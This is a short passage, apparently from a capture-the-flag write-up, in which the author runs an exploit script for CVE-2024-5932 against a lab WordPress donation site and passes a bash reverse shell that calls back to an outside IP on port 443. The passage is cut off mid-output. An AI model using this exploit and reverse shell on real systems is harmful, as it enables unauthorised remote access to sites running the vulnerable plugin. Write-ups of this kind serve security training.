@@ -1,0 +1,1 @@
+ing , curl , and wget don’t work, but a bash reverse shell does: oxdf@hacky$ uv run CVE-2024-5932-rce.py --url http://giveback.htb/donations/the-things-we-need/ --cmd 'bash -c "bash -i >& /dev/tcp/10.10.14.44/443 0>&1"' ...[snip]... [\] Exploit loading, please wait... [+] Requested Data: {'give-form-id': '17', 'give-form-hash': '605966acef', 'give-price-id': '0', 'give-amount':
